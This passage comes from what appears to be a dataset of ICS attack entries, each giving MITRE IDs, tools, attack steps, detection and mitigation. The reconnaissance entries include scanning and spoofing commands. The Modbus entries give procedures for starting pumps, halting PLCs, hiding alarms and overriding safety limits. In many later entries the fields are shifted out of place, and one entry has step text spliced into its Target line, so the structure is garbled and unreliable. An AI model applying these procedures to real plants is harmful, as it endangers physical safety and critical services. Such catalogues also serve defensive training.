- **Target**: ICS Network
- **Vulnerability**: Unrestricted access to mirrored traffic
- **MITRE**: T1595.002
- **Impact**: Full visibility into ICS operations
- **Tools**: Wireshark
- **Scenario**: Attacker abuses a misconfigured switch mirror port to see all ICS traffic.
- **Attack Steps**: Step 1: Connect attacker laptop to port configured as SPAN/mirror port.Step 2: Launch Wireshark and let it passively sniff traffic.Step 3: Filter protocols like modbus, dnp3, iec104, or tcp.port == 502.Step 4: Note internal IPs, function codes, device roles, and timing.Step 5: Save .pcap files for protocol replay or deeper analysis.
- **Detection**: Alert on mirrored port plug/unplug events
- **Solution**: Lock mirror ports with NAC or switch ACLs
- **Tags**: Mirror Port, Passive, ICS

## ICS Network Topology Mapping via Traceroute

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Routers / Firewalls
- **Vulnerability**: Internal routing visible
- **MITRE**: T1595
- **Impact**: Identifies paths between zones
- **Tools**: traceroute, MTR
- **Scenario**: Attacker uses traceroute to map internal routing devices between IT and ICS zones.
- **Attack Steps**: Step 1: On attacker system, run traceroute 192.168.50.1 to reach ICS subnet.Step 2: Use MTR (mtr -rw 192.168.50.1) for continuous hops view.Step 3: Identify internal routers, gateways, firewalls from intermediate IPs.Step 4: Repeat for multiple targets to identify redundant paths.Step 5: Build topology graph using hop count and latency.
- **Detection**: Detect ICMP route mapping attempts
- **Solution**: Block ICMP from unauthorized devices
- **Tags**: Traceroute, ICS Mapping

## Automated ICS Device Discovery using FOCA

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Docs, Shared Drives
- **Vulnerability**: Internal doc leakage
- **MITRE**: T1596
- **Impact**: Reveals config and device IPs
- **Tools**: FOCA, Windows Explorer
- **Scenario**: Attacker extracts IPs and metadata of ICS devices from internal documentation and exposed shares.
- **Attack Steps**: Step 1: Locate shared files (e.g., docs, spreadsheets) using Windows Explorer or SMB scans.Step 2: Use FOCA to load documents and extract metadata like last edited by, IP addresses, printer names.Step 3: Highlight terms like PLC, HMI, SCADA in metadata.Step 4: Organize discovered info into a device inventory.Step 5: Cross-check with scanned IPs.
- **Detection**: Monitor doc access and metadata exports
- **Solution**: Strip metadata before sharing ICS files
- **Tags**: Metadata Recon, ICS Docs

## Multicast DNS (mDNS) Enumeration in ICS Zones

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Devices using mDNS
- **Vulnerability**: mDNS enabled in ICS
- **MITRE**: T1590.002
- **Impact**: Reveals ICS services through multicast
- **Tools**: Wireshark, Avahi Browser
- **Scenario**: Attacker sniffs mDNS traffic to learn hostnames and roles of ICS systems.
- **Attack Steps**: Step 1: Start Wireshark and filter udp.port == 5353.Step 2: Wait for multicast DNS queries like _modbus._tcp.local, _hmi._tcp.local.Step 3: Use Avahi Browser to browse services.Step 4: Extract hostname, service name, IP address.Step 5: Record service presence and frequency for target analysis.
- **Detection**: Detect unusual mDNS services in ICS
- **Solution**: Disable mDNS where not used
- **Tags**: mDNS, ICS Naming

## ICS VLAN Probing via Double Tagging

- **Attack Type**: Port Scanning
- **Target**: ICS VLANs
- **Vulnerability**: Switch misconfigured against VLAN hopping
- **MITRE**: T1595, T1071
- **Impact**: Grants access to protected ICS VLAN
- **Tools**: Scapy, Wireshark
- **Scenario**: Attacker crafts double-tagged VLAN packets to access isolated ICS VLANs.
- **Attack Steps**: Step 1: Use Scapy to craft a packet with outer VLAN tag of attacker VLAN and inner tag of ICS VLAN.Step 2: Send it to the switch and see if forwarded.Step 3: Use Wireshark to monitor response.Step 4: If reply is seen, ICS VLAN is reachable.Step 5: Use follow-up tools (Nmap) to scan for services.
- **Detection**: Monitor unexpected VLAN traffic
- **Solution**: Implement VLAN hop protections
- **Tags**: VLAN Hop, Scapy

## Broadcast Ping Sweep Using hping3

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Hosts
- **Vulnerability**: Broadcast response enabled
- **MITRE**: T1595
- **Impact**: Rapid live device discovery
- **Tools**: hping3
- **Scenario**: Attacker uses broadcast address to ping entire ICS subnet.
- **Attack Steps**: Step 1: Use hping3 --icmp -c 1 -a 192.168.1.1 -d 120 --spoof 192.168.1.1 192.168.1.255 to broadcast ping.Step 2: Wait for replies from devices.Step 3: Use tcpdump to log responses.Step 4: Identify live ICS systems by source IPs.Step 5: Document for follow-up scans.
- **Detection**: Detect broadcast pings via flow logs
- **Solution**: Disable directed broadcast replies
- **Tags**: Broadcast, Ping Sweep

## Identification of SCADA HMI Web Login Portals

- **Attack Type**: Port Scanning
- **Target**: Web-based HMI
- **Vulnerability**: Default page branding
- **MITRE**: T1592, T1596
- **Impact**: Reveals brand, software, HMI access
- **Tools**: Nmap, WhatWeb
- **Scenario**: Attacker scans for specific HTTP titles & favicons associated with ICS HMIs.
- **Attack Steps**: Step 1: Use nmap --script http-title -p 80,443 192.168.0.0/24.Step 2: Look for page titles like FactoryTalk View, WinCC Login.Step 3: Run WhatWeb to fingerprint CMS or technologies used.Step 4: If accessible, screenshot login page and vendor details.Step 5: Use results for social engineering or targeted password spraying.
- **Detection**: Monitor for title probes or favicon harvesting
- **Solution**: Use generic branding, hide portal title
- **Tags**: ICS HMI Login, HTTP Recon

## Ethernet/IP Scanner for Rockwell PLCs

- **Attack Type**: Port Scanning
- **Target**: Rockwell PLCs
- **Vulnerability**: Exposed CIP services
- **MITRE**: T1046
- **Impact**: Full device fingerprint for Rockwell systems
- **Tools**: EIPScan, Nmap
- **Scenario**: Attacker scans for Allen-Bradley devices using Ethernet/IP protocol.
- **Attack Steps**: Step 1: Scan port 44818 using nmap -p 44818 10.0.0.0/24.Step 2: Use EIPScan to send Ethernet/IP identify requests to targets.Step 3: Receive module name, vendor, device type, serial, and firmware.Step 4: Record this info in attack log for Rockwell device targeting.Step 5: Research CVEs for matching model and firmware.
- **Detection**: Alert on Ethernet/IP connection attempts
- **Solution**: Filter CIP traffic and use DPI firewalls
- **Tags**: Rockwell, CIP, ICS

## SNMP Enumeration for ICS Device Metadata

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Field Devices, Switches, PLCs
- **Vulnerability**: SNMP exposed with default or public community string
- **MITRE**: T1046, T1595.002
- **Impact**: Leaks detailed metadata about ICS infrastructure
- **Tools**: Nmap, snmpwalk
- **Scenario**: Attacker queries SNMP-enabled ICS devices to extract system info like device type, uptime, location, and contact.
- **Attack Steps**: Step 1: Run nmap -sU -p 161 --script snmp-info 192.168.1.0/24 to discover SNMP devices (Tool: Nmap).Step 2: Use snmpwalk -v2c -c public [IP] to query SNMP data (Tool: snmpwalk).Step 3: Look for values like sysDescr, sysContact, sysLocation that reveal device role and operator.Step 4: Identify ICS-specific MIBs or devices from Rockwell, Siemens, etc.Step 5: Log all discovered info for network profiling and target prioritization.
- **Detection**: Monitor SNMP queries from unknown hosts
- **Solution**: Change community strings and limit SNMP to admin network
- **Tags**: SNMP, ICS Metadata, Passive Recon

## Enumerating ICS Admin Shares over SMB

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Engineering Workstations
- **Vulnerability**: Unprotected or read-only shares
- **MITRE**: T1039, T1046
- **Impact**: Allows readout of project files and backups
- **Tools**: smbclient, CrackMapExec
- **Scenario**: Attacker connects to ICS Windows hosts via SMB and lists available shared folders to locate engineering files.
- **Attack Steps**: Step 1: Run smbclient -L //[target IP] -N to list shared folders (Tool: smbclient).Step 2: If access is allowed, identify shares like Engineering, Projects, Siemens_Backup.Step 3: Use crackmapexec smb [target IP] --shares for automation and quick scans (Tool: CrackMapExec).Step 4: Record shares with read or write permissions.Step 5: Note sensitive file paths for future access simulation.
- **Detection**: Log SMB share access and list requests
- **Solution**: Restrict share permissions and segment networks
- **Tags**: ICS Share Recon, SMB Enum

## Discovering RTU Systems Using Serial-over-IP

- **Attack Type**: Network Reconnaissance
- **Target**: RTUs, Field Serial Devices
- **Vulnerability**: Serial-over-IP exposed to LAN
- **MITRE**: T1046, T1595.002
- **Impact**: Access to remote terminal unit over Ethernet
- **Tools**: Nmap, ser2net, Telnet
- **Scenario**: Attacker scans for Serial-to-IP converters or devices exposing RS-232/RS-485 over Ethernet.
- **Attack Steps**: Step 1: Run nmap -p 23,2001,4999 10.10.0.0/24 to find serial servers (Tool: Nmap).Step 2: Attempt a Telnet connection to each responsive host (Tool: Telnet).Step 3: If raw serial feed is visible, observe for Modbus ASCII, DNP3, or command logs.Step 4: Use ser2net or equivalent software to simulate RTU client (Tool: ser2net).Step 5: Note IP/port combo and device type for attack planning.
- **Detection**: Detect telnet/serial sessions from rogue hosts
- **Solution**: Isolate serial/IP bridges in a DMZ
- **Tags**: ICS RTU, Serial Recon

## Identifying ICS Firewalls and Their Rules

- **Attack Type**: Network Reconnaissance
- **Target**: filtered, or dropped status, deduce firewall rules.Step 4: Send invalid TCP flags (hping3 -FPU) to test how firewall handles malformed packets.Step 5: Log target IPs, port status, and firewall reaction pattern.
- **Vulnerability**: ICS Firewalls, Routers
- **MITRE**: Firewall leaks behavior via responses
- **Impact**: T1595, T1046
- **Tools**: hping3, Nmap
- **Scenario**: Attacker tests packet responses to deduce firewall presence and rule behavior between zones.
- **Attack Steps**: Step 1: Use hping3 -S -p 502 --rand-source [target IP] to test Modbus port with spoofed IPs (Tool: hping3).Step 2: Run nmap -p 502,20000,44818 --reason and observe response codes (Tool: Nmap).Step 3: Based on filtered, open
- **Detection**: Reveals ICS segmentation rules
- **Solution**: Alert on malformed or spoofed packets
- **Tags**: Harden stateful rulesets and enable logging

## Banners & Login Prompts in Telnet-Based ICS Gear

- **Attack Type**: Network Reconnaissance
- **Target**: Legacy ICS Devices
- **Vulnerability**: Telnet used without banner obfuscation
- **MITRE**: T1592.002, T1046
- **Impact**: Reveals ICS device make, model, and software
- **Tools**: Telnet, Netcat
- **Scenario**: Attacker connects to legacy ICS gear with Telnet enabled and reads banners/login prompts to identify devices.
- **Attack Steps**: Step 1: Run nmap -p 23 --script banner [IP range] to detect Telnet (Tool: Nmap).Step 2: Use telnet [IP] 23 or nc [IP] 23 to connect manually (Tool: Telnet, Netcat).Step 3: Observe welcome banners like “Welcome to SCADA Terminal” or device type (e.g., Emerson RTU v4).Step 4: Record login prompts, default usernames, or hint messages.Step 5: Save screenshot or notes for later exploitation via weak credentials.
- **Detection**: Detect Telnet traffic and banner reads
- **Solution**: Disable Telnet and use SSH with banners removed
- **Tags**: Telnet, Banner Grabbing, ICS Recon

## Modbus Command Injection - Start Unauthorized Pump

- **Attack Type**: Modbus Spoofing
- **Target**: PLC / HMI
- **Vulnerability**: Lack of authentication in Modbus protocol
- **MITRE**: T0884 - Spoof Command Message
- **Impact**: Physical process disruption
- **Tools**: Scapy, ModbusPal
- **Scenario**: An attacker spoofs a Modbus "Start" command to remotely activate a water pump at a treatment facility without authorization.
- **Attack Steps**: Step 1: Setup a Modbus test server (e.g., ModbusPal) on a different machine to simulate a pump.Step 2: Connect the attacker machine to the same network as the Modbus server.Step 3: Use Wireshark to observe Modbus TCP traffic and identify Unit ID and Function Codes used.Step 4: Craft a Modbus packet using Scapy to send Function Code 5 (Write Single Coil) to turn the pump ON.Step 5: Send the spoofed command to the Modbus server’s IP address and port 502.Step 6: Observe the pump simulator indicating the pump has started without proper authorization.
- **Detection**: Monitor unexpected Modbus traffic, log unauthorized function codes
- **Solution**: Use encrypted Modbus variants (e.g., Modbus/TLS), network segmentation
- **Tags**: modbus, spoofing, SCADA, water plant

## Fake Sensor Reading Injection via Modbus

- **Attack Type**: Modbus Spoofing
- **Target**: HMI
- **Vulnerability**: No source verification in Modbus
- **MITRE**: T0855 - Man-in-the-Middle
- **Impact**: Misinformation to operators
- **Tools**: Modbus Fuzzer, Scapy
- **Scenario**: Attacker sends false sensor data to HMI pretending to be a PLC, tricking operators.
- **Attack Steps**: Step 1: Use ModbusPal to simulate a PLC and configure registers (e.g., temperature = 25°C).Step 2: Attacker captures HMI request packets and sees it reading Holding Register 40001.Step 3: Use Scapy to craft a fake Modbus response to that register with value "80" (falsely indicating 80°C).Step 4: Spoof source IP as the PLC's address to fool the HMI.Step 5: Send the spoofed response immediately after HMI requests it.Step 6: Observe HMI now shows "80°C", creating a false alarm.
- **Detection**: Compare PLC readings with expected ranges, detect IP spoofing
- **Solution**: Deploy secure gateway between PLC and HMI
- **Tags**: SCADA spoofing, fake data, Modbus, ICS

## Intercept and Modify Modbus Write Command

- **Attack Type**: Modbus Spoofing / MITM
- **Target**: HMI ↔ PLC
- **Vulnerability**: Lack of integrity check in Modbus
- **MITRE**: T0815 - Exploit Protocol Vulnerability
- **Impact**: Process override, physical malfunction
- **Tools**: Ettercap, Scapy, Wireshark
- **Scenario**: A malicious actor intercepts a legitimate control command and modifies its value in transit to cause an unintended effect.
- **Attack Steps**: Step 1: Setup network with HMI and PLC simulator using Modbus TCP.Step 2: Use ARP spoofing via Ettercap to position attacker as MITM between HMI and PLC.Step 3: Let HMI issue command to close a valve (write 0 to register).Step 4: Capture and alter the packet to write 1 (open valve) instead using Scapy.Step 5: Forward modified packet to PLC.Step 6: Observe valve simulator remains open, while HMI believes it is closed.
- **Detection**: Compare sent vs. received Modbus data
- **Solution**: Use signed Modbus or VPN tunnels for PLC comms
- **Tags**: spoofing, MITM, SCADA, Modbus injection

## Replay Attack on Modbus - Reusing Valid Commands

- **Attack Type**: Modbus Spoofing / Replay
- **Target**: PLC
- **Vulnerability**: No session validation or anti-replay in Modbus
- **MITRE**: T0813 - Capture Replay
- **Impact**: Repeated unauthorized actions
- **Tools**: Wireshark, Scapy
- **Scenario**: An attacker captures valid Modbus command packets and replays them to alter process states repeatedly.
- **Attack Steps**: Step 1: Use Wireshark to capture a Modbus command from HMI to PLC (e.g., start motor).Step 2: Save this packet and extract Function Code, Register Address, and Payload.Step 3: Use Scapy to recreate the packet identically.Step 4: Send it repeatedly from attacker machine to PLC IP.Step 5: Observe motor simulator starts each time attacker replays the packet.Step 6: No authentication means attacker can repeat commands without detection.
- **Detection**: Look for same command patterns from unexpected sources
- **Solution**: Timestamping and anti-replay mechanisms
- **Tags**: replay, modbus, ICS, SCADA spoof

## Denial of Service via Invalid Modbus Commands

- **Attack Type**: Modbus Spoofing / DoS
- **Target**: PLC / HMI
- **Vulnerability**: Lack of input validation in ICS devices
- **MITRE**: T0814 - Endpoint Denial of Service
- **Impact**: System crash or disruption
- **Tools**: Modbus Fuzzer, Python
- **Scenario**: Attacker sends malformed Modbus requests to crash the PLC or HMI.
- **Attack Steps**: Step 1: Run a Modbus server simulator on port 502.Step 2: Use Python with pymodbus or scapy to craft malformed packets (e.g., invalid function codes like 0xFF).Step 3: Flood the target with these invalid Modbus messages.Step 4: Observe PLC or HMI simulator becomes unresponsive or throws protocol errors.Step 5: Restart needed to restore normal operation.Step 6: Demonstrates how poor input handling in ICS devices causes availability issues.
- **Detection**: Monitor invalid function codes in network logs
- **Solution**: Input sanitization, rate-limiting on Modbus server
- **Tags**: fuzzing, DoS, modbus spoofing, ICS attack

## Fake Shutdown Command to PLC

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: PLC
- **MITRE**: Insecure protocol with no auth
- **Impact**: T0884
- **Tools**: Scapy, Wireshark
- **Scenario**: An attacker impersonates the control system to send a spoofed shutdown command to a PLC controlling industrial machinery.
- **Attack Steps**: Step 1: Use Wireshark to monitor real Modbus TCP traffic between HMI and PLC.Step 2: Identify the target PLC IP and the Function Code used to control machinery (e.g., Write Coil).Step 3: Use Scapy to craft a Modbus TCP packet with Function Code 5 and set output to 0 (OFF).Step 4: Spoof the source IP as the HMI to make the PLC think it is a legitimate shutdown command.Step 5: Send the packet to the PLC and observe the machinery halting operation.Step 6: Validate that operators are unaware of this spoofed event.
- **Detection**: Unplanned machine shutdown
- **Solution**: Anomaly alerts, source IP tracing
- **Tags**: Secure protocol, Modbus TLS

## Forge Response Data to Fake Safe Readings

- **Attack Type**: Modbus Spoofing
- **Target**: Ettercap, Scapy
- **Vulnerability**: HMI
- **MITRE**: Trust-based communication
- **Impact**: T0855
- **Tools**: Scapy, Ettercap
- **Scenario**: The attacker intercepts and fakes a Modbus response to show safe values to the HMI while actual sensors are reporting danger.
- **Attack Steps**: Step 1: Start a simulated network with PLC and HMI using ModbusPal.Step 2: Use Ettercap to ARP poison both HMI and PLC to intercept traffic.Step 3: Monitor Modbus responses from PLC to HMI that contain sensor data (e.g., temperature or pressure).Step 4: When HMI requests data, intercept and modify the Modbus response to a safe value (e.g., 25°C instead of 95°C).Step 5: Send forged response to HMI.Step 6: Observe HMI shows incorrect safe value.
- **Detection**: Misleading operator, safety risk
- **Solution**: Data verification, checksum mismatch
- **Tags**: Authenticated response channels

## Spoof Sensor Failures to Trigger Emergency

- **Attack Type**: Modbus Spoofing
- **Target**: ModbusPal, Wireshark, Scapy
- **Vulnerability**: HMI
- **MITRE**: No source identity check
- **Impact**: T0856
- **Tools**: Scapy, Wireshark, ModbusPal
- **Scenario**: Attacker crafts Modbus messages that simulate sensor failure codes to trigger emergency response protocols.
- **Attack Steps**: Step 1: Set up simulated PLC with ModbusPal and define registers for sensor status codes.Step 2: Identify registers holding fault states (e.g., 1 = OK, 2 = Warning, 3 = Failure).Step 3: Use Scapy to craft a Modbus message writing value 3 to the fault register.Step 4: Spoof the source as the sensor or PLC.Step 5: Send the command to the HMI’s expected update channel.Step 6: HMI shows failure alert and triggers shutdown protocol.
- **Detection**: Induced panic, emergency halt
- **Solution**: Unexpected status register values
- **Tags**: Signed messages, validate sources

## Confuse SCADA Logic with Random Register Values

- **Attack Type**: Modbus Spoofing
- **Target**: Mod_RSsim, pymodbus
- **Vulnerability**: SCADA System
- **MITRE**: No value range validation
- **Impact**: T0815
- **Tools**: Modbus Fuzzer, Python
- **Scenario**: A random set of Modbus register values is sent to confuse the SCADA system logic into faulty operation.
- **Attack Steps**: Step 1: Launch a simulated Modbus slave server (Mod_RSsim or ModbusPal).Step 2: Identify holding/input registers used by the SCADA logic (via Wireshark).Step 3: Write a Python script using pymodbus to send random values to those registers.Step 4: Send spoofed values that break expected logic (e.g., pressure higher than temperature).Step 5: Observe the SCADA system taking incorrect actions.Step 6: Review logs to see confusion caused by logic misfire.
- **Detection**: Logic malfunction
- **Solution**: Detect value anomalies with thresholds
- **Tags**: Validate all field input ranges

## PLC Stop via Spoofed Reset Command

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, ModScan
- **Vulnerability**: PLC
- **MITRE**: No auth on reset command
- **Impact**: T0811
- **Tools**: Scapy, ModScan
- **Scenario**: Attacker sends a Modbus message to reset or stop the PLC, halting all connected devices.
- **Attack Steps**: Step 1: Use ModScan or Modbus Doctor to identify PLC’s address and supported commands.Step 2: Find a writable register or coil associated with PLC reset (varies by manufacturer).Step 3: Craft a Modbus Write Single Register/Coil packet with a value that resets the PLC.Step 4: Send the spoofed reset command using Scapy.Step 5: Observe the PLC going offline and devices halting.Step 6: Check PLC logs for unauthorized write.
- **Detection**: PLC crash or factory halt
- **Solution**: PLC watchdog alerts
- **Tags**: Disable remote reset unless secure

## Simulate Valve Leak Alert via Register Spoofing

- **Attack Type**: Modbus Spoofing
- **Target**: ModbusPal, Scapy
- **Vulnerability**: HMI
- **MITRE**: No register-level verification
- **Impact**: T0855
- **Tools**: Scapy, HMI Simulator
- **Scenario**: Fake Modbus values cause HMI to display a simulated valve leak condition.
- **Attack Steps**: Step 1: Configure ModbusPal with valves and leak indicator registers.Step 2: Observe normal leak indicator register value (e.g., 0 = no leak).Step 3: Craft a Modbus Write Single Register command and set leak register to 1.Step 4: Spoof the message as coming from the valve sensor.Step 5: HMI receives fake alert and shows leak message.Step 6: Operator mistakenly initiates maintenance.
- **Detection**: False positive alert, downtime
- **Solution**: Alert flood detection
- **Tags**: Confirm alarms via secondary sensors

## Hide Critical Alarm from Operator

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: HMI
- **MITRE**: Alarm status not encrypted or signed
- **Impact**: T0856
- **Tools**: Scapy, Wireshark
- **Scenario**: Modify alarm status register in response packets so the operator never sees real alerts.
- **Attack Steps**: Step 1: Identify alarm register addresses via packet analysis.Step 2: Capture the original response packet with active alarm (value = 1).Step 3: Modify the response packet to value 0 (alarm cleared).Step 4: Spoof the response to the HMI.Step 5: HMI now shows no alarm.Step 6: Critical incident occurs without awareness.
- **Detection**: Unnoticed hazard escalation
- **Solution**: Alarm log correlation with PLC data
- **Tags**: Secure alarm communication

## PLC Loop via Malicious Register Injection

- **Attack Type**: Modbus Spoofing
- **Target**: pymodbus, Wireshark
- **Vulnerability**: PLC
- **MITRE**: No bounds checking
- **Impact**: T0815
- **Tools**: Python (pymodbus), Wireshark
- **Scenario**: Inject register values that put PLC into a never-ending loop, disrupting normal function.
- **Attack Steps**: Step 1: Identify loop condition registers (e.g., register triggers loop when > 100).Step 2: Use pymodbus to send a value like 999 to the loop trigger register.Step 3: PLC enters infinite loop and becomes unresponsive.Step 4: SCADA system shows no update or data.Step 5: Operator attempts to restart but loop triggers again.Step 6: Physical reset required.
- **Detection**: Loop lockout, unresponsive PLC
- **Solution**: Watchdog timers, threshold alerts
- **Tags**: Use logic limits in PLC code

## Override Safety Limit with Modbus Spoof

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: Safety config not secured
- **Impact**: T0815
- **Tools**: ModScan, Scapy
- **Scenario**: Change Modbus register value that defines max safe limit to an unsafe value.
- **Attack Steps**: Step 1: Use ModScan to read safety configuration registers.Step 2: Find a max temp or pressure limit register.Step 3: Craft a packet to change it from 100°C to 999°C using Write Single Register.Step 4: Send it as if from the central configuration tool.Step 5: Real readings now bypass safety triggers.Step 6: Danger remains undetected.
- **Detection**: Safety mechanisms disabled
- **Solution**: Config integrity check
- **Tags**: Lock configuration behind auth

## SCADA Reconnaissance via Spoofed Requests

- **Attack Type**: Modbus Spoofing / Recon
- **Target**: Nmap, ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: Lack of access control on queries
- **Impact**: T0842
- **Tools**: ModScan, Scapy, Nmap
- **Scenario**: Send spoofed requests to enumerate coil and register maps of PLCs for future attack planning.
- **Attack Steps**: Step 1: Scan network using Nmap to identify Modbus-speaking devices (port 502).Step 2: Use ModScan or Scapy to send Read Coils (Function Code 1) and Read Holding Registers (Function Code 3).Step 3: Spoof requests as legitimate queries from HMI.Step 4: Log responses to map register layout, function codes, and device info.Step 5: Use info for future payload crafting.Step 6: Replay traffic patterns to stay stealthy.
- **Detection**: System mapping, future prep
- **Solution**: Monitor Modbus scans
- **Tags**: Restrict read access via firewall

## Forge HMI Commands to Enable Unsafe Mode

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: Unsafe command acceptance
- **Impact**: T0884
- **Tools**: Scapy, ModScan
- **Scenario**: Attacker pretends to be HMI and sends Modbus command to disable safety lock.
- **Attack Steps**: Step 1: Use ModScan to locate safety configuration coils/registers.Step 2: Identify value 1 as "safe mode ON", and 0 as "safe mode OFF".Step 3: Craft a spoofed packet using Scapy with Function Code 5 to write 0.Step 4: Spoof source IP as HMI and send to PLC.Step 5: PLC disables safety checks, thinking the command came from HMI.Step 6: Monitor changes in operation showing safety disabled.
- **Detection**: Unsafe physical operations
- **Solution**: Monitor config changes
- **Tags**: Secure HMI-PCL protocol

## Drop Real Data, Inject Fake Status Packets

- **Attack Type**: Modbus Spoofing / MITM
- **Target**: Ettercap, Scapy
- **Vulnerability**: HMI
- **MITRE**: No response verification
- **Impact**: T0855
- **Tools**: Ettercap, Scapy
- **Scenario**: In MITM position, attacker drops real PLC responses and injects fake ones.
- **Attack Steps**: Step 1: Use Ettercap for ARP spoofing between HMI and PLC.Step 2: Intercept PLC’s data responses containing actual sensor status.Step 3: Drop or block the real packet.Step 4: Immediately inject a crafted response with fake normal values using Scapy.Step 5: HMI displays forged status, hiding real system issues.Step 6: Operator fails to act, believing all is fine.
- **Detection**: Data forgery, critical failure hidden
- **Solution**: Alert on dropped packets
- **Tags**: Secure channel with auth

## Simulate Fake Process Status to Engineer

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: Engineer Console
- **MITRE**: Trust in response data
- **Impact**: T0856
- **Tools**: Scapy, Wireshark
- **Scenario**: Attacker sends fake register data to a maintenance engineer’s system showing false status.
- **Attack Steps**: Step 1: Engineer remotely connects to view PLC status (port 502).Step 2: Use Wireshark to identify status register addresses (e.g., 40005 = motor running).Step 3: Craft a spoofed packet showing motor is ON when it’s actually OFF.Step 4: Send forged Modbus response while impersonating PLC.Step 5: Engineer sees wrong status and proceeds with action based on wrong data.Step 6: Demonstrates spoofing risk in remote maintenance.
- **Detection**: Misled response actions
- **Solution**: Compare readings from multiple sources
- **Tags**: Strong identity checks

## Timed Command Injection to Trigger at Specific Time

- **Attack Type**: Modbus Spoofing
- **Target**: Python, Task Scheduler
- **Vulnerability**: PLC
- **MITRE**: Protocol unauthenticated, time-blind
- **Impact**: T0849
- **Tools**: Python (pymodbus), Task Scheduler
- **Scenario**: An attacker injects a Modbus command to trigger a function (e.g., start motor) at a specific time when operators are away.
- **Attack Steps**: Step 1: Identify control register (e.g., motor = register 40010).Step 2: Write a Python script using pymodbus to send a write command with value 1 (start).Step 3: Use Windows Task Scheduler (or cron in Linux) to schedule this script at 3 AM.Step 4: At scheduled time, spoofed command is sent to PLC.Step 5: Motor starts while no one is monitoring.Step 6: Logs show command came from internal network.
- **Detection**: Unattended equipment activation
- **Solution**: Monitor out-of-hours actions
- **Tags**: Time-based access control

## Flood PLC with Randomized Coil Changes

- **Attack Type**: Modbus Spoofing / DoS
- **Target**: ModScan, pymodbus
- **Vulnerability**: PLC
- **MITRE**: Rate-limiting not configured
- **Impact**: T0814
- **Tools**: Python (pymodbus), Scapy
- **Scenario**: An attacker sends rapid coil changes to overwhelm or confuse the PLC.
- **Attack Steps**: Step 1: Identify multiple output coil addresses via ModScan.Step 2: Create a looped script using pymodbus that sends alternating values (0/1) rapidly to each coil.Step 3: Loop the script to continuously flood the PLC.Step 4: Observe the PLC lagging or crashing.Step 5: Operator sees erratic behavior or device reboots.Step 6: Recovery requires restart or physical intervention.
- **Detection**: Device crash, erratic behavior
- **Solution**: Monitor rate of Modbus writes
- **Tags**: Set request thresholds in firewall

## Spoofed Diagnostics to Mask Faults

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy
- **Vulnerability**: HMI / Engineering Console
- **MITRE**: No validation of diagnostics
- **Impact**: T0856
- **Tools**: Scapy
- **Scenario**: Attacker sends a fake Modbus diagnostic response to mask PLC faults.
- **Attack Steps**: Step 1: Use Function Code 8 (diagnostics) to query PLC for faults.Step 2: Craft a spoofed response showing all diagnostics as “normal” (e.g., zeroed bytes).Step 3: Send spoofed packet to HMI or engineering workstation.Step 4: Observer falsely believes all devices are healthy.Step 5: Hidden faults worsen while operator is misled.Step 6: Fault logs later mismatch reality.
- **Detection**: Faults go undetected
- **Solution**: Compare diagnostics from PLC logs
- **Tags**: Use signed Modbus variants

## Flip Remote Switch via Spoofed Packet

- **Attack Type**: Modbus Spoofing
- **Target**: ModbusPal, Scapy
- **Vulnerability**: PLC
- **MITRE**: Spoofed switch control
- **Impact**: T0884
- **Tools**: Scapy, ModbusPal
- **Scenario**: Remote attacker flips a switch (e.g., fan ON/OFF) using a spoofed Modbus packet.
- **Attack Steps**: Step 1: Set up ModbusPal with a switch register (0 = OFF, 1 = ON).Step 2: Identify the register (e.g., 00010) via SCADA observation.Step 3: Craft a Modbus Write Single Coil packet with Function Code 5 and value 1.Step 4: Spoof source IP as authorized HMI.Step 5: Send the packet to ModbusPal.Step 6: Switch activates without actual operator input.
- **Detection**: Unwanted physical operations
- **Solution**: Real-time log comparison
- **Tags**: Secure control interface

## Multi-Packet Spoof: Control + Response Injection

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Wireshark
- **Vulnerability**: HMI / PLC
- **MITRE**: Protocol lacks mutual auth
- **Impact**: T0856
- **Tools**: Scapy, Wireshark
- **Scenario**: Attacker sends both spoofed command and fake response to maintain illusion of legitimacy.
- **Attack Steps**: Step 1: Spoof a Modbus write command to turn on a pump.Step 2: Immediately craft a forged response to the HMI confirming the change.Step 3: Spoof both source and destination IPs for HMI and PLC.Step 4: Send packets with accurate transaction IDs to look legit.Step 5: HMI shows correct update, despite no legit communication.Step 6: Attacker maintains deception without detection.
- **Detection**: Invisible unauthorized change
- **Solution**: Monitor for unknown MAC/IP activity
- **Tags**: Use Modbus firewall + logs

## Spoofing Sensor Error to Force Manual Override

- **Attack Type**: Modbus Spoofing
- **Target**: ModbusPal, Scapy
- **Vulnerability**: HMI
- **MITRE**: No validation of sensor origin
- **Impact**: T0856
- **Tools**: Scapy, ModbusPal
- **Scenario**: A spoofed error from a sensor forces operator to manually override automation.
- **Attack Steps**: Step 1: Identify sensor error register from ModbusPal (e.g., 40020 = 0 normal, 2 = error).Step 2: Craft packet with Function Code 6 (Write Single Register) and value 2.Step 3: Send spoofed packet to HMI from fake sensor IP.Step 4: Operator sees error and switches system to manual mode.Step 5: Attacker can now exploit manual operations.Step 6: Demonstrates reliance on unverified sensor data.
- **Detection**: Forced operational shift
- **Solution**: Validate alerts from multiple sensors
- **Tags**: Secure sensor-GW bridge

## Simultaneous Multi-Device Spoofing to Cause Panic

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Python
- **Vulnerability**: HMI / PLC
- **MITRE**: System trusts all Modbus data
- **Impact**: T0856
- **Tools**: Scapy, Python
- **Scenario**: Multiple spoofed alarms from different devices sent at once to trigger panic shutdown.
